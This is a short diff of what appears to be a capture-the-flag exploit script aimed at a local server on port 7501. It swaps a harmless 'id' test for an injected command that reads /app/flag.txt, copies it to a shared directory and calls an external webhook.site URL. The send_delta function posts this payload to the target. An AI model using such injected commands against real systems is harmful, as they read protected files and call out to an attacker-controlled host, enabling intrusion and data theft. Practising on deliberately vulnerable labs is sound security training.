@@ -37,7 +37,7 @@ class Root:
 
 server_host = 'http://127.0.0.1:7501'
 server_host =  server_host
-command =  'id'
+command =  'cat /app/flag.txt > /tmp/shared/flag.txt && curl https://webhook.site/f28e742d-3a2f-40d0-8072-e22313f20193'
 
 def send_delta(d):
     # this posts a delta to the remote host
